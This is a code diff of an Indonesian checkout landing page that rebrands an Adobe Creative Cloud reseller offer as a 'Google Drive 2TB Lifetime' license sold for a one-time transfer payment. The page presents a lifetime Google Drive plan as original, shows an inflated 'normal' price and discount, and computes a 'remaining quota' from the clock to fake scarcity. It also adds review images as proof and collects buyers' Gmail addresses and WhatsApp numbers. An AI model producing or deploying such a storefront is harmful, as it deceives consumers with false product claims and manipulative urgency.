+            { q: "Apakah ada biaya perpanjangan di tahun berikutnya?", a: "TIDAK ADA. Sesuai janji kami, ini adalah paket Lifetime (Sekali Bayar). Anda cukup membayar satu kali di awal, dan nikmati fitur premium selamanya tanpa tagihan bulanan/tahunan." },
+            { q: "Bagaimana cara klaim garansi jika terjadi kendala?", a: "Kami menyediakan support via WhatsApp yang siap membantu. Jika terjadi kendala teknis dari sisi kami yang tidak bisa diselesaikan, kami akan mengembalikan uang Anda 100% atau memberikan unit pengganti." },
+            { q: "Berapa lama waktu pengerjaan setelah saya transfer?", a: "Sistem kami bekerja semi-otomatis. Biasanya diproses dalam 5-10 menit saat jam kerja. Paling lambat 1x24 jam jika antrian sedang padat. Pastikan bukti transfer jelas agar verifikasi lebih cepat." }
         ];
 
         const packages = {
-            monthly: {
-                id: 'monthly',
-                name: "Adobe CC (1 Bulan)",
-                price: 50000,
-                normalPrice: 250000
-            },
-            yearly: {
-                id: 'yearly',
-                name: "Adobe CC (1 Tahun)",
-                price: 350000,
-                normalPrice: 2500000
+            lifetime: {
+                id: 'lifetime',
+                name: "Google Drive 2TB (Lifetime)",
+                price: 250000,
+                normalPrice: 1579000
             }
         };
 
@@ -1096,7 +1097,7 @@
 
             return { isValid: true, message: 'Nomor valid.' };
         }
-        let currentPackage = 'yearly';
+        let currentPackage = 'lifetime';
         let currentPayment = 'qris';
         let expiryTime;
         let countdownInterval;
@@ -1124,15 +1125,9 @@
             if (!container) return;
 
             const formatCurrency = (amount) => `Rp ${amount.toLocaleString('id-ID')}`;
-            const pkg = packages[currentPackage];
 
-            // Determine styles for switcher based on selection
-            const isMonthly = currentPackage === 'monthly';
-            const isYearly = currentPackage === 'yearly';
-
-            const btnClassBase = "flex-1 py-2 text-xs font-semibold rounded-lg transition-all duration-200";
-            const btnClassActive = "bg-white text-red-600 shadow-sm ring-1 ring-black/5";
-            const btnClassInactive = "text-gray-500 hover:text-gray-700 hover:bg-gray-50";
+            const lifetime = packages.lifetime;
+            const discount = Math.round(((lifetime.normalPrice - lifetime.price) / lifetime.normalPrice) * 100);
 
             // Calculate dynamic quota
             const now = new Date();
@@ -1145,17 +1140,17 @@
             const quota = Math.floor(Math.max(2, Math.min(100, p)));
 
             container.innerHTML = `
-                <!-- Product Info Card - Mobile Optimized -->
+                <!-- Product Info Card - Mobile Optimized (Adapted from Adobe Design) -->
                 <article class="relative overflow-hidden rounded-2xl border border-gray-200 bg-white shadow-sm">
                     
                     <!-- Product Header -->
-                    <div class="bg-gradient-to-br from-red-50 via-white to-orange-50 p-4 pb-3 border-b border-gray-100">
+                    <div class="bg-gradient-to-br from-blue-50 via-white to-cyan-50 p-4 pb-3 border-b border-gray-100">
                         <div class="flex items-start justify-between mb-2">
                             <div class="flex items-center gap-2">
-                                <span class="inline-flex items-center gap-1 rounded-full bg-red-100 px-2 py-0.5 text-[11px] font-bold text-red-700">
+                                <span class="inline-flex items-center gap-1 rounded-full bg-blue-100 px-2 py-0.5 text-[11px] font-bold text-blue-700">
                                     <span class="relative flex h-1.5 w-1.5">
-                                        <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-500 opacity-75"></span>
-                                        <span class="relative inline-flex rounded-full h-1.5 w-1.5 bg-red-600"></span>
+                                        <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-blue-500 opacity-75"></span>
+                                        <span class="relative inline-flex rounded-full h-1.5 w-1.5 bg-blue-600"></span>
                                     </span>
                                     Stok Tersedia
                                 </span>
@@ -1163,47 +1158,27 @@
                             <span class="rounded-md bg-black px-2 py-0.5 text-[10px] font-bold text-white uppercase tracking-wide">Terlaris</span>
                         </div>
                         
-                        <h3 class="text-[19px] font-extrabold text-gray-900 leading-tight mb-1">Adobe Creative Cloud</h3>
+                        <h3 class="text-[19px] font-extrabold text-gray-900 leading-tight mb-1">Google Drive 2TB</h3>
                         <p class="text-[13px] text-gray-600 font-medium flex items-center gap-1">
                             <i class="fas fa-check-circle text-green-600 text-xs"></i>
-                            All Apps + 100GB Cloud Storage
+                            Original Lifetime License (Seumur Hidup)
                         </p>
                     </div>
 
-                    <!-- Package Selection -->
-                    <div class="px-4 pt-4 pb-3">
-                        <p class="text-[11px] font-bold text-gray-500 uppercase tracking-wide mb-2">Pilih Durasi Langganan</p>
-                        <div class="bg-gray-50 p-1 rounded-xl flex gap-1 ring-1 ring-gray-200/70">
-                            <button type="button" onclick="switchPackage('monthly')" 
-                                class="${btnClassBase} ${isMonthly ? btnClassActive : btnClassInactive}">
-                                <div class="flex flex-col items-center">
-                                    <span class="font-bold">1 Bulan</span>
-                                </div>
-                            </button>
-                            <button type="button" onclick="switchPackage('yearly')" 
-                                class="${btnClassBase} ${isYearly ? btnClassActive : btnClassInactive}">
-                                <div class="flex flex-col items-center">
-                                    <span class="font-bold">1 Tahun</span>
-                                    <span class="text-[10px] opacity-80">⚡ Hemat 86%</span>
-                                </div>
-                            </button>
-                        </div>
-                    </div>
-
                     <!-- Pricing Section -->
-                    <div class="px-4 pb-4">
-                        <div class="bg-gradient-to-br from-red-50 to-orange-50 rounded-xl p-3 border border-red-100">
+                    <div class="p-4">
+                        <div class="bg-gradient-to-br from-blue-50 to-cyan-50 rounded-xl p-3 border border-blue-100">
                             <div class="flex items-center justify-between mb-1">
                                 <div>
                                     <p class="text-[11px] font-semibold text-gray-500 mb-0.5">Harga Promo Hari Ini</p>
                                     <div class="flex items-baseline gap-2">
-                                        <span class="text-[28px] font-black text-red-600 leading-none tracking-tight">${formatCurrency(pkg.price)}</span>
+                                        <span class="text-[28px] font-black text-blue-600 leading-none tracking-tight">${formatCurrency(lifetime.price)}</span>
                                     </div>
                                 </div>
                                 <div class="text-right">
                                     <p class="text-[10px] text-gray-500 mb-0.5">Normal</p>
-                                    <span class="text-[13px] font-bold text-gray-400 line-through">${formatCurrency(pkg.normalPrice)}</span>
-                                    <p class="text-[11px] font-bold text-green-600 mt-0.5">Hemat ${Math.round((1 - pkg.price / pkg.normalPrice) * 100)}%</p>
+                                    <span class="text-[13px] font-bold text-gray-400 line-through">${formatCurrency(lifetime.normalPrice)}</span>
+                                    <p class="text-[11px] font-bold text-green-600 mt-0.5">Hemat ${discount}%</p>
                                 </div>
                             </div>
                         </div>
@@ -1243,7 +1218,7 @@
                     <div class="px-4 pb-4">
                         <div class="flex gap-2">
                             <button type="button" onclick="document.getElementById('nama').focus()" 
-                                class="flex-1 h-12 rounded-xl bg-[#E31E24] text-white shadow-md active:scale-[0.98] transition-all hover:bg-[#C21B20] group">
+                                class="flex-1 h-12 rounded-xl bg-[#1a73e8] text-white shadow-lg shadow-blue-200 active:scale-[0.98] transition-all hover:bg-[#1557b0] group">
                                 <div class="flex items-center justify-center gap-2 font-bold text-[15px]">
                                     <span>Ambil Promo Sekarang</span>
                                     <i class="fas fa-arrow-right text-sm opacity-80 group-hover:translate-x-1 transition-transform"></i>
@@ -1251,7 +1226,7 @@
                             </button>
                             
                             <button id="btnDetail" type="button" 
-                                class="h-12 w-12 rounded-xl border-2 border-gray-200 bg-white text-gray-600 flex items-center justify-center active:scale-[0.95] hover:bg-gray-50 hover:border-red-200 transition-all"
+                                class="h-12 w-12 rounded-xl border-2 border-gray-200 bg-white text-gray-600 flex items-center justify-center active:scale-[0.95] hover:bg-gray-50 hover:border-blue-200 transition-all"
                                 aria-label="Lihat Detail Lengkap">
                                 <i class="fas fa-info-circle text-[17px]"></i>
                             </button>
@@ -1265,16 +1240,12 @@
                 </article>
             `;
 
+            // Init Sheet Logic after render
             initSheetLogic();
         }
 
-        // Global switcher function
-        window.switchPackage = function (pkgId) {
-            if (currentPackage === pkgId) return;
-            selectPackage(pkgId); // Updates state and re-renders
-        };
-
         let sheetInitialized = false;
+
         function initSheetLogic() {
             const sheet = document.getElementById("sheet");
             if (!sheet) return;
@@ -1302,6 +1273,7 @@
             const btnClose = document.getElementById("btnClose");
             const btnOk = document.getElementById("btnOk");
 
+            // Populate features
             const listContainer = document.getElementById("sheet-features-list");
             if (listContainer && typeof fullFeaturesList !== 'undefined') {
                 listContainer.innerHTML = fullFeaturesList.map(feat => `
@@ -1354,6 +1326,7 @@
                                 </div>
                             </div>
                             <p class="t-text">"${item.text}"</p>
+                            ${item.img ? `<img src="${item.img}" class="t-review-img" onclick="openImageModal('${item.img}')" alt="Bukti Review" loading="lazy">` : ''}
                         </div>
                     `).join('')}
                 </div>
@@ -1387,16 +1360,6 @@
         function openImageModal(url) {
             document.getElementById('modalImageDisplay').src = url;
             document.getElementById('imageModal').classList.add('active');
-        }
-
-        function selectPackage(pkgId) {
-            currentPackage = pkgId;
-            document.getElementById('selectedPackage').value = pkgId;
-
-            // Re-render the package cards to update the 'selected' state visually
-            renderPackageCards();
-
-            updateTotalPrice();
         }
 
         function selectPayment(paymentId) {
@@ -1444,7 +1407,7 @@
                 return { valid: false, msg: 'Email tidak valid', element: emailInput };
             }
 
-            const domain = email.split('@')[1];
+            const domain = email.split('@')[1].toLowerCase();
             if (!allowedEmailDomains.includes(domain)) {
                 return { valid: false, msg: 'Domain email tidak diizinkan. Harap gunakan email pribadi.', element: emailInput };
             }
@@ -1474,8 +1437,8 @@
             const totalPrice = pkg.price + uniqueCode;
             const now = new Date();
             const rL = () => "ABCDEFGHIJKLMNOPQRSTUVWXYZ".charAt(Math.floor(Math.random() * 26));
-            const rD = () => Math.floor(Math.random() * 10);
-            const paymentId = `INV-ADOBE-${String(now.getFullYear()).slice(-2)}${String(now.getMonth() + 1).padStart(2, '0')}${String(now.getDate()).padStart(2, '0')}-${rL()}${rD()}${rL()}${rD()}`;
+            const rN = () => Math.floor(Math.random() * 10);
+            const paymentId = `INV-GDRIVE-${String(now.getFullYear()).slice(-2)}${String(now.getMonth() + 1).padStart(2, '0')}${String(now.getDate()).padStart(2, '0')}-${rL()}${rN()}${rL()}${rN()}`;
 
             // Prepare Object for Google Script
             const dataToSend = {
@@ -1541,7 +1504,7 @@
             // Populate invoice summary
             document.getElementById('invoice-details-summary').innerHTML = `
                 <span>No. Invoice: <strong>${data.idPembayaran}</strong></span>
-                <a href="#" onclick="showDetailsModal(event)" class="font-semibold text-red-600">Lihat detail</a>
+                <a href="#" onclick="showDetailsModal(event)" class="font-semibold text-blue-600">Lihat detail</a>
             `;
 
             // Generate WA Link
@@ -1787,7 +1750,7 @@
                                 <p class="font-medium">${whatsapp}</p>
                             </div>
                              <div>
-                                <p class="text-gray-500 text-xs mb-0.5">Email Adobe ID</p>
+                                <p class="text-gray-500 text-xs mb-0.5">Email Gmail</p>
                                 <p class="font-medium">${details.email}</p>
                             </div>
                         </div>
